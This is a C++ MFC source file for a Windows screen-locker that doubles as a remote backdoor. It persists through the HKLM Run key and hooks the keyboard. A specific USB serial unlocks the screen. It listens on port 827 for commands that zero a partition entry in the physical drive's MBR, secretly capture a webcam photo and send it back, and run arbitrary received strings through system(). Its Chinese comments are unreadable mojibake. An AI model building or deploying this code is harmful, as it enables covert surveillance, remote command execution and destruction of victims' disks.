
// NDlg.cpp : ʵ���ļ�
//

#include "stdafx.h"
#include "N.h"
#include "NDlg.h"
#include "afxdialogex.h"
#include <Dbt.h>
#include<winsock2.h>
#include <windows.h>
#include <tchar.h>
#include <stdio.h>
#include<iostream>
#include <VersionHelpers.h>
#include <string.h>
#include<afxsock.h>
#include <winioctl.h>
#include "cv.h"
#include<highgui.h>
#include <opencv2\opencv.hpp> 
#pragma comment (lib,"ws2_32")
using namespace std;
using namespace cv;

#ifdef _DEBUG
#define new DEBUG_NEW
#endif
#define WM_USER_NOTIFYICON WM_USER+1
_declspec(dllimport) void SetHook(bool q);

CSocket photosocket;


#define BOOTRECORDSIZE 440

typedef struct _BOOTRECORD {


	unsigned char BootRecord[BOOTRECORDSIZE];


}BOOTRECORD, *PBOOTRECORD;

#define DPTSIZE 64

typedef struct _DPT {


	unsigned char Dpt[DPTSIZE];


}DPT, *PDPT;





typedef struct _MBR {

	BOOTRECORD BootRecord;              //��������
	unsigned char ulSinged[4];          //Windows ����ǩ��
	unsigned char sReserve[2];          //����λ
	DPT Dpt;                            //������
	unsigned char EndSign[2];           //������־




}MBR, *PMBR;

#define DPTNUMBER 4
typedef struct _DP {

	unsigned char BootSign;           //������־
	unsigned char StartHsc[3];
	unsigned char Partitiontype;        //��������
	unsigned char EndHsc[3];
	unsigned int SectorsPreceding;    //������֮ǰʹ�õ�������
	unsigned int SectorInPartition;
}DP, *PDP;



// CNDlg �Ի���
CBrush m_brush;

HKEY hWrite;
HKEY hUsb;
TCHAR pUsbnum[MAX_PATH] = _T("HGH");
TCHAR pUsbnum1[MAX_PATH] = _T("USB\\VID_090C&PID_1000\\AA00000000003671");

TCHAR pFileName[MAX_PATH] = _T("HGH");

DWORD dw = GetModuleFileName(NULL, pFileName, MAX_PATH);
DWORD du;
DWORD dUSize = sizeof(pUsbnum);
CString String;
int flag=0;
CSocket serverSocket;




int Sender(TCHAR FileName[]) {
	AfxSocketInit();


	int tag = 0;
	DWORD dwRead;

	BOOL bRet;
	HANDLE hFile = CreateFile(FileName, GENERIC_READ, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	char ReadBuf[102400];
	CHAR SendBuf[4096];
	CHAR End[5] = { "End!" };
	//bRet = ReadFile(hFile, ReadBuf, 102400, &dwRead, NULL);
	while (TRUE) {




		bRet = ReadFile(hFile, ReadBuf, 102400, &dwRead, NULL);
		if (bRet == 0) {

			//MessageBox(NULL, L"ReadFile ERROR!", L"Error", MB_OK);
			break;

		}

		else if (dwRead == 0) {
			send(serverSocket, End, 5, 0);
			Sleep(1500);
			break;
		}

		else
		{
			//MessageBox(NULL, L"Send Buf ", L"Error", MB_OK);
			send(serverSocket
				, ReadBuf, 102400, 0);
		}

		

		//recv(s, szBufferAccpect, MAXBYTE, NULL);

		//	cout<<"Server:"<<szBufferAccpect<<endl;



	}
	/*closesocket(s);
	WSACleanu0p();*/
	//send(serverSocket, End, 1024, 0);
	//serverSocket.Close();
	//serverSocket.Close();
	CloseHandle(hFile);
	//	MessageBox(NULL, L"Send Bufer OK", L"Error", MB_OK);

	return tag = 1;
}


int TakePhoto() {
	int tag = 0;
	char keyCode = 0;
	IplImage  outimage;
	Mat input_image;
	VideoCapture cam(0);
	if (!cam.isOpened()) exit(0);
	namedWindow("input image");
	/*while (true) {
	if (27 == waitKey(30)) {
	break;
	}*/
	cam >> input_image;
	//imshow("input image", input_image);

	/*f (keyCode == 13) {*/

	outimage = input_image;

	CHAR* outImageName = "E://test.jpg";
	cvSaveImage(outImageName, &outimage);
	//Sender(L"D://test.jpg");


	cvDestroyAllWindows();
	tag=Sender(L"E://test.jpg");
	return tag;

}








void kill(HANDLE hDevice, int check) {

	MBR Mbr = { 0 };

	DWORD dwRead = 0;
	DWORD dwBytesReturned = 0;
	DWORD dwNumberOfBytesWritten = 0;
	PMBR pMbrKill = &Mbr;


	unsigned char FixMbr[16] = { 0x00 ,0xFE ,0xFF ,0xFF ,0x0F ,0xFE ,0xFF ,0xFF ,0x00 ,0x70 ,0xC8 ,0x0E ,0x00 ,0x48 ,0x1F ,0x00 };

	if (ReadFile(hDevice, (LPVOID)pMbrKill, 512, &dwRead, NULL)) {

		printf("ReadFile successful  \r\n");

	}
	/*for (int i = 0; i < 512; i++) {
	printf("%02X ", ((BYTE*)pMbrKill)[i]);
	if ((i + 1) % 16 == 0) {
	printf("\r\n");
	}
	}*/

	CloseHandle(hDevice);

	if (hDevice = CreateFile(L"\\\\.\\PhysicalDrive0",//02  
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		0,
		NULL)) {
		printf("CreateFile successful");
	}
	/*for (int i = 0; i < 3; i++) {
	Mbr.Dpt.Dpt[i] = { 0 };      //ɾ��������2
	}*/

	for (int i = 48; i < 64; i++) {
		/*printf("%02X ", Mbr.Dpt.Dpt[i]);
		if ((i + 1) % 16 == 0) {
		printf("\r\n");
		}*/
		Mbr.Dpt.Dpt[i] = { 0 };
	}

	if (DeviceIoControl(hDevice, FSCTL_LOCK_VOLUME, NULL, 0, NULL, 0, &dwBytesReturned, NULL))
	{
		//cout << "LOCK successful \r\n" << endl;

	}
	//cin >> check;
	if (check == 1) {

		if (WriteFile(hDevice, (LPCVOID)pMbrKill, 512, &dwNumberOfBytesWritten, NULL)) {
			//printf("Kill Mbr SUCCESSFUL %d \r\n", dwNumberOfBytesWritten);
			//MessageBox(NULL, _T("KIll Mbr SUCCESSFUL!!"), NULL, MB_OK);
			CloseHandle(hDevice);
		}

	}
	else if (check == 2) {

		for (int i = 48, j = 0; i < 64; i++, j++) {
			/*printf("%02X ", Mbr.Dpt.Dpt[i]);
			if ((i + 1) % 16 == 0) {
			printf("\r\n");
			}*/
			Mbr.Dpt.Dpt[i] = FixMbr[j];
		}
		if (WriteFile(hDevice, (LPCVOID)pMbrKill, 512, &dwNumberOfBytesWritten, NULL)) {
			//printf("fix Mbr SUCCESSFUL %d \r\n", dwNumberOfBytesWritten);
			//MessageBox(NULL, _T("fix Mbr SUCCESSFUL!!"), NULL, MB_OK);
			CloseHandle(hDevice);
		}
	}
	if (DeviceIoControl(hDevice, FSCTL_UNLOCK_VOLUME, NULL, 0, NULL, 0, &dwBytesReturned, NULL))
	{
		//	cout << "UNLOCK successful \r\n" << endl;

	}

	/*for (int i = 0; i < 512; i++) {
	printf("%02X ", ((BYTE*)pMbrKill)[i]);
	if ((i + 1) % 16 == 0) {
	printf("\r\n");
	}
	}*/

}

int server(){
	AfxSocketInit();


	int flag = 0;
	int tag=0;
	CSocket aSocket;
	aSocket.Socket();
	UINT nPort = atoi("827");
	BOOL bOptVal = TRUE;
	char szRecvMsg[7] = { 0 };
	int bOptLen = sizeof(BOOL);
	char key[7] = { "nibiru" };
	char lock[7]{"holmes"};
	char Kill[7] = {"kilmbr"};
	char Fix[7] = {"fixmbr"};
	char Photo[7] = { "photos" };
	char Shutdown[7] = { "shutdn" };
	char cmd[20] = { 0 };
	aSocket.SetSockOpt(SO_REUSEADDR, (void *)&bOptVal, bOptLen, SOL_SOCKET);
	CString cs;
	aSocket.Bind(nPort);
	aSocket.Listen();



	aSocket.Accept(serverSocket);
	
	//AfxMessageBox(L"Accept");
	serverSocket.Receive(szRecvMsg, 6);
	//sprintf_s(szRecvMsg,sizeof(szRecvMsg), "���ܵ��Ĳ�����: %s \r\n", szRecvMsg);
	cs = szRecvMsg;

	if (!strcmp(szRecvMsg, key)){
		
		AfxGetApp()->m_pMainWnd->ShowWindow(SW_HIDE);
		SetHook(false);
		tag = 1;

	}
	else if (!strcmp(szRecvMsg, lock)) {
		AfxGetApp()->m_pMainWnd->ShowWindow(SW_SHOW);
		SetHook(true);
		tag = 1;
	}
	
	else if (!strcmp(szRecvMsg, Kill)) {
		HANDLE hDevice;



		if (hDevice = CreateFile(L"\\\\.\\PhysicalDrive0",//02  
			GENERIC_READ | GENERIC_WRITE,
			FILE_SHARE_READ | FILE_SHARE_WRITE,
			NULL,
			OPEN_EXISTING,
			0,
			NULL)) {
			printf("CreateFile successful");
		}

		kill(hDevice, 1);

	}
	else if (!strcmp(szRecvMsg, Fix)) {
		HANDLE hDevice;



		if (hDevice = CreateFile(L"\\\\.\\PhysicalDrive0",//02  
			GENERIC_READ | GENERIC_WRITE,
			FILE_SHARE_READ | FILE_SHARE_WRITE,
			NULL,
			OPEN_EXISTING,
			0,
			NULL)) {
			printf("CreateFile successful");
		}

		kill(hDevice, 2);
		
	}
	else if (!strcmp(szRecvMsg, Photo)) {


		//MessageBox(NULL, L"Take photo", L"Error", MB_OK);
		flag=TakePhoto();
		while (!flag) {}
		//photosocket = serverSocket;

	}
	else if(!strcmp(szRecvMsg, Shutdown)) {
		memset(cmd,0,20);
		serverSocket.Receive(cmd, sizeof(cmd));
		//MessageBox(NULL,cmd, L"Error", MB_OK);
	//	WinExec(cmd, SW_SHOW);
		system(cmd);

	}
	serverSocket.Close();//�ر�  
	aSocket.Close();
	return tag;

}

CNDlg::CNDlg(CWnd* pParent /*=NULL*/)
	: CDialogEx(CNDlg::IDD, pParent)
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CNDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CNDlg, CDialogEx)
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_MESSAGE(WM_USER_NOTIFYICON, OnNotifyMsg)//��Ϣӳ��
	ON_BN_CLICKED(IDOK, &CNDlg::OnBnClickedOk)
	ON_BN_CLICKED(IDCANCEL, &CNDlg::OnBnClickedCancel)
	
	
END_MESSAGE_MAP()


// CNDlg ��Ϣ�������

BOOL CNDlg::OnInitDialog()
{
	
	
	
	CDialogEx::OnInitDialog();
	//SetHook(true);
	// ���ô˶Ի����ͼ�ꡣ  ��Ӧ�ó��������ڲ��ǶԻ���ʱ����ܽ��Զ�
	//  ִ�д˲���
	SetIcon(m_hIcon, TRUE);			// ���ô�ͼ��
	SetIcon(m_hIcon, FALSE);		// ����Сͼ��
	m_tnid.cbSize = sizeof NOTIFYICONDATA;
	m_tnid.hWnd = this->m_hWnd;
	m_tnid.uID = IDR_MAINFRAME;
	m_tnid.hIcon = LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDR_MAINFRAME));
	m_tnid.uCallbackMessage = WM_USER_NOTIFYICON;
	m_tnid.uFlags = NIF_ICON | NIF_MESSAGE | NIF_TIP; //OK,����������̲�����.   
	Shell_NotifyIcon(NIM_ADD, &m_tnid);

	RegCreateKeyEx(HKEY_LOCAL_MACHINE, _T("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), 0, NULL,
	REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS | KEY_WOW64_64KEY, NULL, &hWrite, &dw);
	RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS | KEY_WOW64_64KEY, &hWrite);
	RegSetValueEx(hWrite, L"Nibiru Holmes", 0, REG_SZ, (const PBYTE)pFileName, (_tcslen(pFileName) + 1) * sizeof(TCHAR));
	
	SetHook(true);
	AfxGetApp()->m_pMainWnd->ShowWindow(SW_SHOW);
	while (1){ server(); }
	
	//CreateThread(NULL, 0, Server2, NULL, 0, NULL);
	
	
	// TODO:  �ڴ���Ӷ���ĳ�ʼ������
	
	return TRUE;  // ���ǽ��������õ��ؼ������򷵻� TRUE
}

// �����Ի��������С����ť������Ҫ����Ĵ���
//  �����Ƹ�ͼ�ꡣ  ����ʹ���ĵ�/��ͼģ�͵� MFC Ӧ�ó���
//  �⽫�ɿ���Զ���ɡ�

void CNDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // ���ڻ��Ƶ��豸������

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// ʹͼ���ڹ����������о���
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// ����ͼ��
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialogEx::OnPaint();
	}
	int cxScreen, cyScreen;//���ڴ�С����
	cxScreen = GetSystemMetrics(SM_CXSCREEN);
	cyScreen = GetSystemMetrics(SM_CYSCREEN);
	SetWindowPos(&wndTopMost, 0, 0, cxScreen, cyScreen, SWP_SHOWWINDOW);//�����ڱ�������ǰ�档
	//SetHook(true);
	//server();
	
}

//���û��϶���С������ʱϵͳ���ô˺���ȡ�ù��
//��ʾ��
HCURSOR CNDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}

char FirstDriveFromMask(ULONG unitmask)//�̷���ȡ
{
	char i;
	for (i = 0; i < 26; ++i)
	{
		if (unitmask & 0x1)
			break;
		unitmask = unitmask >> 1;
	}
	return (i + 'A');
}

LRESULT CNDlg::WindowProc(UINT message, WPARAM wParam, LPARAM lParam)
{

	// TODO: �ڴ����ר�ô����/����û���
	switch (message)
	{
		//WM_DEVICECHANGE��ϵͳӲ���ı䷢����ϵͳ��Ϣ
	case WM_DEVICECHANGE:
	{
							PDEV_BROADCAST_HDR lpdb = (PDEV_BROADCAST_HDR)lParam;
							switch (wParam)
							{
							case WM_DEVICECHANGE:
								break;
							case DBT_DEVICEARRIVAL://DBT_DEVICEARRIVAL���豸�����������ҿ���ʹ��
							{
													   if (lpdb->dbch_devicetype == DBT_DEVTYP_VOLUME)//�߼���
													   {
														   PDEV_BROADCAST_VOLUME lpdbv = (PDEV_BROADCAST_VOLUME)lpdb;
														   switch (lpdbv->dbcv_flags)
														   {
														   case 0:                //U��
														   {
																					  CString decDriver;
																					  decDriver = FirstDriveFromMask(lpdbv->dbcv_unitmask);
																					  //TRACE1("��⵽U��:[%s]����!\n",decDriver.GetBuffer(0))
																					  //AfxMessageBox(L"��⵽U�̲���");
																					  RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Services\\USBSTOR\\Enum", 0, KEY_ALL_ACCESS | KEY_WOW64_64KEY, &hUsb);
																					  RegQueryValueEx(hUsb, L"0", NULL, NULL, (LPBYTE)pUsbnum, &dUSize);
																					  //MessageBox((LPCTSTR)pUsbnum1);
																					  //MessageBox((LPCTSTR)pUsbnum);
																					  


																					  if (!(lstrcmp(pUsbnum,pUsbnum1))){
																						 
																						 
																						  AfxGetApp()->m_pMainWnd->ShowWindow(SW_HIDE);
																					     
																				          SetHook(false);
																					  }
																					  
																					  

														   }
															   break;
														   }
													   }
							}
								break;
							case DBT_DEVICEREMOVECOMPLETE://DBT_DEVICEREMOVECOMPLETE,�豸ж�ػ��߰γ�
							{
															  if (lpdb->dbch_devicetype == DBT_DEVTYP_VOLUME)//�߼���
															  {
																  PDEV_BROADCAST_VOLUME lpdbv = (PDEV_BROADCAST_VOLUME)lpdb;
																  switch (lpdbv->dbcv_flags)
																  {
																  case 0:                //U��
																  {
																							 CString decDriver;
																							 decDriver = FirstDriveFromMask(lpdbv->dbcv_unitmask);
																							 //TRACE1("��⵽U��:[%s]�γ�!\n",decDriver.GetBuffer(0));								
																							 
																							 AfxGetApp()->m_pMainWnd->ShowWindow(SW_SHOW);
																							// AfxMessageBox(L"look");
																							 
																							 /*while (!flag){
																								 flag = Server();
																							 
																							 }*/
																							// AfxMessageBox(L"unlook");
																							 SetHook(true);
																							
																  }
																	  break;
																  }
															  }
							}
								break;
							}
	}
		break;
		while (1){ server(); }
	}
	//�������е���Ϣ����
	switch (message) //�ж���Ϣ����  
	{
	case WM_USER_NOTIFYICON:
		//������û��������Ϣ   
		if (lParam == WM_LBUTTONDBLCLK)

		{
			//���˫��ʱ�����ڳ���   
			if (AfxGetApp()->m_pMainWnd->IsWindowVisible()) //�жϴ��ڵ�ǰ״̬  
			{
				AfxGetApp()->m_pMainWnd->ShowWindow(SW_HIDE); //���ش���  
			}
			else
			{
				AfxGetApp()->m_pMainWnd->ShowWindow(SW_SHOW); //��ʾ����   
			}

		}
		/*else if(lParam==WM_RBUTTONDOWN)
		{ //����Ҽ���������ѡ��
		CMenu menu;
		menu.LoadMenu(IDR_MENU1); //�������ȶ����ѡ��
		CMenu *pMenu=menu.GetSubMenu(0);
		CPoint pos;
		GetCursorPos(&pos);
		pMenu->TrackPopupMenu(TPM_LEFTALIGN|TPM_RIGHTBUTTON,pos.x,pos.y,AfxGetMainWnd());
		} */
		break;
	case WM_SYSCOMMAND:
		//�����ϵͳ��Ϣ   
		if (wParam == SC_MINIMIZE)
		{
			//���յ���С����Ϣʱ����������   
			AfxGetApp()->m_pMainWnd->ShowWindow(SW_HIDE);
			return 0;
		}
		if (wParam == SC_CLOSE)
		{
			::Shell_NotifyIcon(NIM_DELETE, &m_tnid); //�ر�ʱɾ��ϵͳ����ͼ��  
		}
		break;
	}


	return CDialog::WindowProc(message, wParam, lParam);
}

LRESULT  CNDlg::OnNotifyMsg(WPARAM wparam, LPARAM lparam)  //�Զ�����Ϣ��Ӧ����
//wParam���յ���ͼ���ID����lParam���յ���������Ϊ     
{
	if (wparam != IDR_MAINFRAME)
		return    1;
	switch (lparam)
	{
		/*case  WM_RBUTTONUP://�Ҽ�����ʱ������ݲ˵�������ֻ��һ�����رա�
		{
		LPPOINT    lpoint=new    tagPOINT;
		::GetCursorPos(lpoint);//�õ����λ��
		CMenu    menu;
		menu.CreatePopupMenu();//����һ������ʽ�˵�
		//���Ӳ˵���رա������������ϢWM_DESTROY�������ڣ���
		//���أ��������������
		menu.AppendMenu(MF_STRING,WM_DESTROY,"�ر�");
		//ȷ������ʽ�˵���λ��
		menu.TrackPopupMenu(TPM_LEFTALIGN,lpoint->x,lpoint->y,this);
		//��Դ����
		HMENU    hmenu=menu.Detach();
		menu.DestroyMenu();
		delete    lpoint;
		}
		break; */
	case    WM_LBUTTONDBLCLK://˫������Ĵ���     
	{
								 this->ShowWindow(SW_SHOW);//�򵥵���ʾ������     
	}
		break;
	}

	return 0;
}

void CNDlg::OnBnClickedOk()
{
	AfxGetApp()->m_pMainWnd->ShowWindow(SW_HIDE);
	while (1){ server(); }
	// TODO:  �ڴ���ӿؼ�֪ͨ����������
	
}


void CNDlg::OnBnClickedCancel()
{
	
	//SetHook(true);
	while (1){ server(); }
	
	// TODO:  �ڴ���ӿؼ�֪ͨ����������
	
	//CreateThread(NULL, 0, Server, NULL, 0, NULL);
	//Sleep(20000);
}




